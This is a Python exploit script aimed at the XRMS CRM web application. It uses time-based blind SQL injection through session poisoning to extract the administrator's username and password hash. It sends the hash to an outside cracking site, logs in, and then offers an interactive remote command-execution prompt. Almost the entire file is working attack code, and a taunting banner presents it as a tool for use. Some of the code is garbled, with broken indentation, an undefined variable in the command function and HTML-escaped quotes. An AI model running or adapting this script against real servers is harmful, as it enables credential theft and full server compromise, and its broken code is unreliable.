# XRMS Blind SQLi via $_SESSION poisoning, then command exec
#########################
 
import urllib
import urllib2
import time
import sys
 
usercharac = [&#039;a&#039;,&#039;b&#039;,&#039;c&#039;,&#039;d&#039;,&#039;e&#039;,&#039;f&#039;,&#039;g&#039;,&#039;h&#039;,&#039;i&#039;,&#039;j&#039;,&#039;k&#039;,&#039;l&#039;,&#039;m&#039;,&#039;n&#039;,&#039;o&#039;,&#039;p&#039;,&#039;q&#039;,&#039;r&#039;,&#039;s&#039;,&#039;t&#039;,&#039;u&#039;,&#039;v&#039;,&#039;w&#039;,&#039;x&#039;,&#039;y&#039;,&#039;z&#039;,&#039;@&#039;,&#039;.&#039;,&#039;_&#039;,&#039;-&#039;,&#039;1&#039;,&#039;2&#039;,&#039;3&#039;,&#039;4&#039;,&#039;5&#039;,&#039;6&#039;,&#039;7&#039;,&#039;8&#039;,&#039;9&#039;,&#039;0&#039;]
userascii = [97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 64, 46, 95, 45, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48]
def banner():
    print """       ____                                      
       / __/_  ______ _  _  ___________ ___  _____
      / /_/ / / / __ `/ | |/_/ ___/ __ `__ \/ ___/
     / __/ /_/ / /_/ / _>  </ /  / / / / / (__  ) 
    /_/  \__,_/\__, (_)_/|_/_/  /_/ /_/ /_/____/  
                 /_/                              
    [+] fuq th3 w0rld, fuq ur m0m!\n"""
 
def usage():
    print " [+] Info: Remote Command Execution via $_SESSION poisoning to SQLi to RCE"
    print " [+] Example:"
    print " [+] python " + sys.argv[0] + " domain.to/xrms"
    quit()
 
def sendhashaway(hash):
    print " [+] Sending hash to icrackhash.com to be cracked."
    data = None
    headers = { &#039;Referer&#039; : &#039;http://icrackhash.com/?mdhash=&#039; + hash + &#039;&type=MD5&#039;,&#039;User-Agent&#039; : &#039;Mozilla&#039;,&#039;X-Requested-With&#039; : &#039;XMLHttpRequest&#039;}
    url = &#039;http://www.icrackhash.com/?mdhash=&#039; + hash + &#039;&type=MD5&#039;
    gh = urllib2.Request(url,data,headers)
    gh2 = urllib2.urlopen(gh)
    output = gh2.read()
    plaintext = getpositions(output,&#039;<td><small><strong>&#039;,&#039;</strong>&#039;)
    print " [-] Plaintext of hash: " +plaintext + "\n"
    return plaintext
 
def username(length):
    length = length + 1
    duser = []
    #1) UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- -
    found = 0
    i = 1
    payload1 = "1) UNION ALL SELECT 1,2,3,4,5,6,7,8,IF(SUBSTRING(username,"
    payload2 = ",1)=CHAR("
    payload3 = "),BENCHMARK(5000000,MD5(0x34343434)),NULL) FROM users-- -"
        for i in range(1,length):
        found = 0
        while(found != 1):
            for f in range(0,len(userascii)):
                class LeHTTPRedirectHandler(urllib2.HTTPRedirectHandler):
                    def http_error_302(self, req, fp, code, msg, headers):
                        infourl = urllib2.addinfourl(fp, headers, req.get_full_url())
                        infourl.status = code
                        infourl.code = code
                        return infourl
                    http_error_300 = http_error_302    
                class HeadRequest(urllib2.Request):
                    def get_method(self):
                        return "POST"
                payload = payload1 + str(i) + payload2 + str(userascii[f]) + payload3
                data = urllib.urlencode([(&#039;user_id&#039;,payload)])
                url = &#039;http://&#039;+domain+&#039;/plugins/webform/new-form.php&#039;
                opener = urllib2.build_opener(LeHTTPRedirectHandler)
                req = HeadRequest(url,data)
                cookie2pos1 = str(cookie1).find(&#039;PHPSESSID&#039;)
                cookie2pos2 = str(cookie1).find("\n",cookie2pos1)
                line = str(cookie1)[cookie2pos1:cookie2pos2 - 9]
                line = &#039;XRMS&#039; + line[9:]
                url = &#039;http://&#039;+domain+&#039;/plugins/useradmin/fingeruser.php&#039;
                headers = { &#039;Cookie&#039; : line }
                data = None
                start = time.time()
                get = urllib2.Request(url,data,headers)
                get.get_method = lambda: &#039;HEAD&#039;
                try:
                    execute = urllib2.urlopen(get)
                except:
                    pass
                elapsed = (time.time() - start)
                if(elapsed > 1):
                    print " Character found. Character is: " + usercharac[f]
                    duser.append(usercharac[f])
                    found = 1
    return duser
 
def getusernamelength():
    found = 0
    i = 1
    payload1 = "1) UNION ALL SELECT 1,2,3,4,5,6,7,8,IF(LENGTH(username) = &#039;"
    payload2 = "&#039;,BENCHMARK(50000000,MD5(0x34343434)),NULL) FROM users-- -"
    while (found != 1): 
        class LeHTTPRedirectHandler(urllib2.HTTPRedirectHandler):
            def http_error_302(self, req, fp, code, msg, headers):
                infourl = urllib2.addinfourl(fp, headers, req.get_full_url())
                infourl.status = code
                infourl.code = code
                return infourl
            http_error_300 = http_error_302    
        class HeadRequest(urllib2.Request):
            def get_method(self):
                return "POST"
        payload = payload1 + str(i) + payload2
        data = urllib.urlencode([(&#039;user_id&#039;,payload)])
        url = &#039;http://&#039;+domain+&#039;/plugins/webform/new-form.php&#039;
        opener = urllib2.build_opener(LeHTTPRedirectHandler)
        req = HeadRequest(url,data)
        cookie2pos1 = str(cookie1).find(&#039;PHPSESSID&#039;)
        cookie2pos2 = str(cookie1).find("\n",cookie2pos1)
        line = str(cookie1)[cookie2pos1:cookie2pos2 - 9]
        line = &#039;XRMS&#039; + line[9:]
        url = &#039;http://&#039;+domain+&#039;/plugins/useradmin/fingeruser.php&#039;
        headers = { &#039;Cookie&#039; : line }
        data = None
        start = time.time()
        get = urllib2.Request(url,data,headers)
        get.get_method = lambda: &#039;HEAD&#039;
        try:
            execute = urllib2.urlopen(get)
        except:
            pass
        elapsed = (time.time() - start)
        if(elapsed > 1):
            print " Length found at position: " + str(i)
            found = 1
            length = i
            return length
        i = i + 1
 
def password(length):
    length = length + 1
    dpassword = []
    #1) UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- -
    found = 0
    i = 1
    payload1 = "1) UNION ALL SELECT 1,2,3,4,5,6,7,8,IF(SUBSTRING(password,"
    payload2 = ",1)=CHAR("
    payload3 = "),BENCHMARK(5000000,MD5(0x34343434)),NULL) FROM users-- -"
        for i in range(1,length):
        found = 0
        while(found != 1):
            for f in range(0,len(userascii)):
                class LeHTTPRedirectHandler(urllib2.HTTPRedirectHandler):
                    def http_error_302(self, req, fp, code, msg, headers):
                        infourl = urllib2.addinfourl(fp, headers, req.get_full_url())
                        infourl.status = code
                        infourl.code = code
                        return infourl
                    http_error_300 = http_error_302    
                class HeadRequest(urllib2.Request):
                    def get_method(self):
                        return "POST"
                payload = payload1 + str(i) + payload2 + str(userascii[f]) + payload3
                data = urllib.urlencode([(&#039;user_id&#039;,payload)])
                url = &#039;http://&#039;+domain+&#039;/plugins/webform/new-form.php&#039;
                opener = urllib2.build_opener(LeHTTPRedirectHandler)
                req = HeadRequest(url,data)
                cookie2pos1 = str(cookie1).find(&#039;PHPSESSID&#039;)
                cookie2pos2 = str(cookie1).find("\n",cookie2pos1)
                line = str(cookie1)[cookie2pos1:cookie2pos2 - 9]
                line = &#039;XRMS&#039; + line[9:]
                url = &#039;http://&#039;+domain+&#039;/plugins/useradmin/fingeruser.php&#039;
                headers = { &#039;Cookie&#039; : line }
                data = None
                start = time.time()
                get = urllib2.Request(url,data,headers)
                get.get_method = lambda: &#039;HEAD&#039;
                try:
                    execute = urllib2.urlopen(get)
                except:
                    pass
                elapsed = (time.time() - start)
                if(elapsed > 1):
                    print " Character found. Character is: " + usercharac[f]
                    dpassword.append(usercharac[f])
                    found = 1
    return dpassword
 
def login(domain,user,password):
    cookie = "XRMS=iseeurgettinown4d"
    url = &#039;http://&#039;+domain+&#039;/login-2.php&#039;
    headers = { &#039;Cookie&#039; : cookie }
    data = urllib.urlencode([(&#039;username&#039;,user),(&#039;password&#039;,password)])
    a1 = urllib2.Request(url,data,headers)
    a2 = urllib2.urlopen(a1)
    output = a2.read()
    if output.find(&#039;PEAR.php&#039;) > 0:
        print " [+] Logged In"
 
def commandexec(domain,command):
    cookie = "XRMS=iseeurgettinown4d"
    cmd = urllib.urlencode([("; echo &#039;0x41&#039;;" + command + ";echo &#039;14x0&#039;;",None)])
    headers = { &#039;Cookie&#039; : cookie }
    data = None
    url = &#039;http://&#039;+domain+&#039;/plugins/useradmin/fingeruser.php?username=&#039; + cmd
    b1 = urllib2.Request(url,data,headers)
    b2 = urllib2.urlopen(a1)
    output = b2.read()
    first = output.find(&#039;0x41&#039;) + 4
    last = output.find(&#039;14x0&#039;) - 4
    return output[first:last]
 
banner()
if len(sys.argv) < 2:
    usage()
domain = sys.argv[1]
print " [+] Grabbing username length"
length = getusernamelength()
print " [+] Grabbing username characters"
tmpuser = username(length)
adminusr = "".join(tmpuser)
print " [+] Grabbing password hash"
tmppass =  password(32)
admpass = "".join(tmppass)
print " [+] Admin username: "+ adminusr
print " [+] Admin password hash: " + admpass
plain = sendhashaway(admpass)
login(domain,adminusr,plain)
while(quit != 1):
    cmd = raw_input(&#039;   [+] Run a command: &#039;)
    if cmd == &#039;quit&#039;:
        print " [-] Hope you had fun :)"
        quit = 1
    if cmd != &#039;quit&#039;:
        print " [+] "+ commandexec(domain,cmd)

